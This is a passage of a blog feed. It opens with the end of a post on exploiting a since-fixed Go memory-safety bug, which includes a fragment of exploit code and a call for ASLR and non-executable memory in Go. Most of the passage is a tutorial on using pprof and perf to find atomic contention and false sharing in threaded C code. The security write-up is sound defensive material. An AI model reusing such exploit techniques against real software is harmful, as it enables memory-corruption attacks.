 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

 &lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;What Now?&lt;/h3&gt;

&lt;p&gt;Well, clearly the &lt;a href="https://code.google.com/p/go/source/detail?r=37bf155bc78073d51c0b5706a4f3fba19cca67f4"&gt;issue&lt;/a&gt;
was fixed. I also think it is important for Go to add the protections
that come now standard with C binaries (ASLR, NX) - I posted 
&lt;a href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html"&gt;an article&lt;/a&gt; 
earlier about security in Go where I strongly advocated those protections. 
Luckily, Go 1.1. will be adding some of these protections: specificially, the 
above exploit will not work because &lt;a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0"&gt;Go 1.1  uses a non-executable heap and stack&lt;/a&gt;.&lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry><entry><title>Introduction to Using Profiling Tools</title><link href="http://codearcana.com/posts/2013/02/26/introduction-to-using-profiling-tools.html" rel="alternate"></link><updated>2013-02-26T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-02-26:posts/2013/02/26/introduction-to-using-profiling-tools.html</id><summary type="html">&lt;h2&gt;Performance tools&lt;/h2&gt;
&lt;p&gt;Frequently, we need to identify slow portions of our programs so we can improve performance. There are a number of tools available to profile programs and identify how much time is spent where. The most common of these tools sample the program periodically, recording information to be later analyzed. Typically, they involve a phase spent recording data and a later phase for analyzing it. We will use two common tools to analyze a simple program: Google &lt;code&gt;pprof&lt;/code&gt; and Linux &lt;code&gt;perf&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Google &lt;code&gt;pprof&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Google &lt;code&gt;pprof&lt;/code&gt; is a tool available as part of the Google &lt;a href="https://code.google.com/p/gperftools/"&gt;&lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt; package. It is is used with
&lt;code&gt;libprofiler&lt;/code&gt;, a sampling based profiler that is linked into your binary. There are 3 steps for using &lt;code&gt;pprof&lt;/code&gt;: linking it into the binary, generating profile output, and analyzing the output. The following links a binary with &lt;code&gt;libprofiler&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc main.c -lprofiler
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For any profile linked with &lt;code&gt;libprofiler&lt;/code&gt;, setting the environment variable &lt;code&gt;CPUPROFILE&lt;/code&gt; enables profiling and specifies the output file. The following command runs &lt;code&gt;./a.out&lt;/code&gt; and prints profiling data to &lt;code&gt;out.prof&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;out.prof ./a.out
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can now analyze this file using &lt;code&gt;pprof&lt;/code&gt;. Below, we output the sample counts for all the functions in &lt;code&gt;a.out&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --text ./a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;Total: 311 samples&lt;/span&gt;
&lt;span class="go"&gt;  144  46.3%  46.3%      144  46.3% bar&lt;/span&gt;
&lt;span class="go"&gt;   95  30.5%  76.8%       95  30.5% foo&lt;/span&gt;
&lt;span class="go"&gt;   72  23.2% 100.0%      311 100.0% baz&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% _start&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;See full documentation &lt;a href="https://google-perftools.googlecode.com/svn/trunk/doc/cpuprofile.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Linux &lt;code&gt;perf&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;On Linux, the &lt;code&gt;perf&lt;/code&gt; system is a powerful tool for analyzing program / system performance. It provides some nice abstractions over tracking hardware counters on different CPUs. It defines a number of events to be tracked and recorded. Run &lt;code&gt;perf list&lt;/code&gt; to see a list of the events allowed on your system. &lt;/p&gt;
&lt;p&gt;To use &lt;code&gt;perf&lt;/code&gt;, you run: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    3121.725439 task-clock                #    0.997 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;             11 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;              7 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            308 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  9,121,960,506 cycles                    #    2.922 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  5,213,187,548 stalled-cycles-frontend   #   57.15% frontend cycles idle    [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;    292,952,401 stalled-cycles-backend    #    3.21% backend  cycles idle    [66.68%]&lt;/span&gt;
&lt;span class="go"&gt;  5,215,556,086 instructions              #    0.57  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    1.00  stalled cycles per insn [83.35%]&lt;/span&gt;
&lt;span class="go"&gt;  1,303,060,483 branches                  #  417.417 M/sec                   [83.35%]&lt;/span&gt;
&lt;span class="go"&gt;         66,559 branch-misses             #    0.01% of all branches         [83.33%]&lt;/span&gt;

&lt;span class="go"&gt;    3.132028707 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition to &lt;code&gt;perf stat&lt;/code&gt;, there quite a few other ways to use perf. Run &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to see a list of the commands (you might want to look into &lt;code&gt;perf record&lt;/code&gt; and &lt;code&gt;perf annotate&lt;/code&gt;). &lt;/p&gt;
&lt;p&gt;For an example of this being used in real life, see this excellent analysis of  &lt;a href="http://thread.gmane.org/gmane.comp.version-control.git/172286"&gt;this analysis of a string comparison bottleneck in &lt;code&gt;git gc&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Our Investigation&lt;/h2&gt;
&lt;p&gt;We compile the program with &lt;code&gt;-lprofiler&lt;/code&gt; so we can generate output to examine. &lt;code&gt;try_perf.c&lt;/code&gt; is a C program that counts the number of even values
in an array of random numbers. We run with 8 threads that all increment a global
counter every time they see an even number.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc try_perf.c -g -lprofiler -lpthread
&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a.out.prof ./a.out --num_threads&lt;span class="o"&gt;=&lt;/span&gt;8
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run pprof and get the source code annotated with the number of probes that 
hit that instruction during the trace (result below trimmed for brevity).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;   .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;   .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;   .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 303    323   65:  for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;   6     10   66:     uint32_t val = arg-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt;   6     15   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;   9    300   68:     __sync_fetch_and_add(args-&amp;gt;evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;   .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The output above is actually misleading: if you look at the assembly (shown below), the instruction immediately after the atomic instruction (the &lt;code&gt;addq   $0x1,-0x8(%rbp)&lt;/code&gt; after the &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;) gets excess hits that count towards the for loop when they should probably count towards the atomic instruction.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  9    300    68: __sync_fetch_and_add(arg-&amp;gt;num_evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;  4      5      4008a4: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;span class="go"&gt;  1      5      4008a8: mov    0x10(%rax),%rax&lt;/span&gt;
&lt;span class="go"&gt;  4    290      4008ac: lock addq $0x1,(%rax)&lt;/span&gt;
&lt;span class="go"&gt;303    320    65: for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;286    287      4008b1: addq   $0x1,-0x8(%rbp)&lt;/span&gt;
&lt;span class="go"&gt;  1      2      4008b6: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrm. Why are we spending a lot of time in &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;To understand this, we will use &lt;code&gt;perf&lt;/code&gt;. Run: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    5793.307952 task-clock                #    2.157 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            589 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             11 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          1,974 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt; 16,378,904,731 cycles                    #    2.827 GHz                     [83.37%]&lt;/span&gt;
&lt;span class="go"&gt; 10,407,719,950 stalled-cycles-frontend   #   63.54% frontend cycles idle    [83.38%]&lt;/span&gt;
&lt;span class="go"&gt;  8,213,634,448 stalled-cycles-backend    #   50.15% backend  cycles idle    [66.65%]&lt;/span&gt;
&lt;span class="go"&gt; 12,070,323,273 instructions              #    0.74  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    0.86  stalled cycles per insn [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  2,428,236,441 branches                  #  419.145 M/sec                   [83.31%]&lt;/span&gt;
&lt;span class="go"&gt;     67,558,697 branch-misses             #    2.78% of all branches         [83.35%]&lt;/span&gt;

&lt;span class="go"&gt;    2.685598183 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow, thats a lot of stalled instructions! The 8 threads are sharing the same counter, generating a lot of memory traffic. We modify the program so they all use their own counter, and then we aggregate at the end (if we do this, we don't need to use the atomic instruction).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;inarray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;pthread_create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;   
 &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
     &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But that didn't seem to help at all! We still spend most of our time on the increment, even though we aren't using an atomic instruction: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 22     44   65:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   66:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;157    308   68:    *(args-&amp;gt;num_evens) += 1;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Why could this be? Lets run &lt;code&gt;perf stat&lt;/code&gt; again and see:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;      4372.474270 task-clock                #    1.882 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;              385 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;                9 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            1,135 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;   12,411,517,583 cycles                    #    2.839 GHz                     [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    6,270,257,100 stalled-cycles-frontend   #   50.52% frontend cycles idle    [83.33%]&lt;/span&gt;
&lt;span class="go"&gt;    4,291,405,838 stalled-cycles-backend    #   34.58% backend  cycles idle    [66.78%]&lt;/span&gt;
&lt;span class="go"&gt;   12,306,996,386 instructions              #    0.99  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                            #    0.51  stalled cycles per insn [83.39%]&lt;/span&gt;
&lt;span class="go"&gt;    2,420,224,187 branches                  #  553.514 M/sec                   [83.40%]&lt;/span&gt;
&lt;span class="go"&gt;       69,182,448 branch-misses             #    2.86% of all branches         [83.30%]&lt;/span&gt;

&lt;span class="go"&gt;      2.323372370 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What is going on now? We &lt;em&gt;still&lt;/em&gt; have a lot of stalled instructions, but all those counters are different. See?&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh, they are all on the same cache line - we're experiencing false sharing. Let us use a thread local counter thats on a different cache line for each thread:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then look at the profile:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64:  size_t num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   65: &lt;/span&gt;
&lt;span class="go"&gt;144    292   66:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   67:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   68:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt; 13     16   69:    num_evens++;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71:  }&lt;/span&gt;
&lt;span class="go"&gt;  4      8   72:  return num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   73: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Good, our increment doesn't dominate the function anymore. We look at &lt;code&gt;perf stat&lt;/code&gt; and see:&lt;/p&gt;
